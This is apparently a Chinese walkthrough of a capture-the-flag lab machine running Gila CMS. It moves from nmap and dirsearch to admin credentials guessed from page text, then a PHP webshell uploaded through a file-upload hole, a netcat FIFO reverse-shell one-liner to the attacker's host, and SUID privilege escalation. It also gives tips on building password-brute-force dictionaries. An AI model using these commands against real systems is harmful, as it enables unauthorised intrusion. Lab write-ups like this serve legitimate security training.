渗透测试步骤

1、使用nmap扫描网段，获得靶机IP

```
nmap -sn 192.168.11.0/24
```

![](../Images/012d49b2578e78ef7bfab455407ff517.png)

2、扫描目标端口，发现开放了22和80端口

```
nmap -sS -Pn -sC 192.168.11.163
```

![](../Images/5f7abf2fdf27fb4fbedd29be00fdcba7.png)

3、访问80端口

![](../Images/330c1aa439afaa94d6176428d17eb366.png)

发现最下方提示需要额外的 WebSec 于是在url中添加 WebSec 路径，发现没什么，全部换成小写的试试，发现了一个新页面

![](../Images/2ce930052c4f9e59f2355fc283dda739.png)

浏览发现了一个邮箱、网站、和一串数字

![](../Images/f0b18f93af6c2b03ec352f4bbf115e8f.png)

4、目录扫描，发现了登录口

```
python dirsearch.py -u http://192.168.11.163/websec/
```

![](../Images/c624c84605c7762e8d0039b133cf68f1.png)

并且发现使用的是 Gila CMS

![](../Images/418e5be35bb3c843a890af513d985c72.png)

尝试使用之前发现的邮箱进行爆破无果  
5、查找 Gila CMS 漏洞，发现存在一个文件上传漏洞，但是需要先登录后台  
所以还是得用账号密码登录后台，根据现有的信息账号应该是出现在网页中的contact@hacknos.com，联想到密码可能也在网页中，于是浏览网页找敏感词汇，最后发现是网页中出现的 Securityx

![](../Images/b2c048e2c9191c996cb7ef01b9e61f7b.png)

6、利用文件上传漏洞  
https://blog.csdn.net/xuandao\_ahfengren/article/details/111357914  
访问如下路径：

```
http://192.168.11.163/websec/admin/fm?f=tmp
```

![](../Images/269ee8e74d414b4c5d5fdc412c8065b6.png)

点击upload上传一个php木马，可以看到是上传到了当前目录，

![](../Images/a19737f10256cad6888b7e317d1a2376.png)

修改目录下的 .htaccess 文件

![](../Images/b2fac8f0fb87e482fc72d556c6c6a575.png)

但是现在不知道具体是在哪个目录，可以点击上层目录查看

![](../Images/8814a54ae0e40560be694a5b97ef4919.png)

发现这是 websec 目录下的一些文件，于是确定上传的木马在 websec/tmp/jiandan.php  
7、使用蚁剑成功连接

![](../Images/646bec0277690dc4cc92615372c24cda.png)

8、在kali开启监听

```
nc -lvp 2333
```

![](../Images/de5bcb9a5321642bb42fb8f67c3fb369.png)

打开蚁剑的虚拟终端，输入命令反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.11.143 2333 >/tmp/f
```

![](../Images/9fb7abb13a02582f50ff0346114694b7.png)

9、获取普通权限下的flag  
输入如下命令获取标准shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](../Images/6c3e318e61aa9a75ad2a09247f0f08f5.png)

10、提权  
这里用到的是suid提权  
使用如下命令查找拥有suid权限的文件

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/fb5dc517d2c8cc32cda554f51a2c3876.png)

如果不知道哪些可以利用，或者不知道用法，可以在下面这个网站进行查询  
https://gtfobins.github.io/

![](../Images/140f15201053bc0ae416fe52883a5e3f.png)

运行命令成功提取到root

![](../Images/3df6126b84d05b7168b3372f80d9d5c4.png)

11、获得root下的flag

![](../Images/ceb20a0b4416ac85be55f3474bb58fa6.png)

总结

这个靶场总体来说还是比较简单的，难点在于根据网页上的信息才能进一步攻击，无论是找路径还是账号密码，毕竟是靶场，与实际情况还是有一些不同(但是也有相同，就是对某个网站进行账号密码爆破时，可以根据网站的一些信息，比如网站名、域名等给密码字典加上一些前缀后缀，这样成功几率更大)，总的思路也是一样的，在发现了使用的CMS后，通过搜索对应CMS的漏洞，上传php木马，蚁剑连接之后反弹shell，然后通过suid提权，成功拿到两个flag。
